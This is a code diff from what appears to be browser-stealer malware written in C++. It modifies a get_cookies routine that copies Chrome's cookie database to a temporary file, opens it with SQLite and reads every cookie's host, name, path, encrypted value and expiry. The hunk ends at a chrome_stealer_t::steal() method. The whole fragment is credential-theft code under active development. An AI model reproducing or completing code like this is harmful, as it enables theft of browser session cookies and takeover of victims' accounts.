@@ -61,34 +61,48 @@ net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_pa
         fs::path temp_cookie_file_path;
         do
         {
-            temp_cookie_file_path = fs::temp_directory_path()
-#ifndef _NDEBUG
-                / "test_cookies"
-#endif
-                / net::generate_random_string(15);
+            temp_cookie_file_path = net::get_temp_unique_file_path();
         } while(fs::exists(temp_cookie_file_path));
 
-        fs::copy_file(cookie_path, temp_cookie_file_path);
-        FS_DEFER([&](...){
-            fs::remove(temp_cookie_file_path);
-        });
-
-        SQLite::Database db(temp_cookie_file_path);
         try
         {
+            fs::copy_file(cookie_path, temp_cookie_file_path);
+            FS_DEFER([&](...){
+                fs::remove(temp_cookie_file_path);
+            });
+
+            SQLite::Database db(temp_cookie_file_path, SQLite::OPEN_READONLY);
+
             if(!db.tableExists("cookies"))
                 continue;
-        } catch (std::exception& e)
+
+            DLOG(std::format("Chrome(DISPLAY): file with cookie {}", cookie_path.path().string()));
+
+            SQLite::Statement query{db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies;"};
+
+            while(query.executeStep())
+            {
+                const auto host_key = query.getColumn(0).getString();
+                const auto name = query.getColumn(1).getString();
+                const auto path = query.getColumn(2).getString();
+                auto encrypted_cookie = (const BYTE*)query.getColumn(3).getBlob();
+                auto encrypted_cookie_size = query.getColumn(3).getBytes();
+                const auto expiry = query.getColumn(4).getUInt();
+
+                DLOG(std::format("Chrome(DISPLAY): {} {} {} {}", host_key, name, path, expiry));
+            }
+        } catch (SQLite::Exception& ex)
+        {
+            if(ex.getErrorCode() != 26)
+                DLOG(std::format("Chrome(ERROR): {} {}", ex.getErrorCode(), ex.what()));
+            continue;
+        } catch (...)
         {
             continue;
         }
-
-        DLOG(std::format("Chrome(DISPLAY): file with cookie {}", cookie_path.path().string()));
-
-        break;
     }
 
-    return net::error_t("Chrome(ERROR): Cant get cookies for temporary path");
+    return net::error_t("Chrome(ERROR): Cant get cookies");
 }
 
 asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
